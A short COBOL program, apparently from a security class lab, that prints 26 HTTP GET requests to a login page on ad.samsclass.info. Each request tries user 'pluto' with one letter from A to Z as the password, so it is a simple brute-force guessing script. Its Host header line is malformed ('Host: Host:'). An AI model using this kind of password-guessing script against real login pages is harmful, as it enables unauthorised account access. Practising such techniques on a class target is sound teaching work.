IDENTIFICATION DIVISION.
    PROGRAM-ID. PLUTO.

    DATA DIVISION.
       WORKING-STORAGE SECTION.
           01 ALPHA PIC A(26) VALUE 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.
           01 CR PIC X VALUE X'0A'.
           01 NUM PIC 9(2) VALUE 0.

    PROCEDURE DIVISION.
       A-PARA.
           PERFORM VARYING NUM FROM 1 BY 1 UNTIL NUM > 26
               DISPLAY 'GET /COBOL/login1.php?u=pluto&p='ALPHA(NUM:1)' HTTP/1.1'
               DISPLAY 'Host: Host: ad.samsclass.info'
               DISPLAY 'User-Agent: COBOL'
               DISPLAY CR
           END-PERFORM.
       STOP RUN.
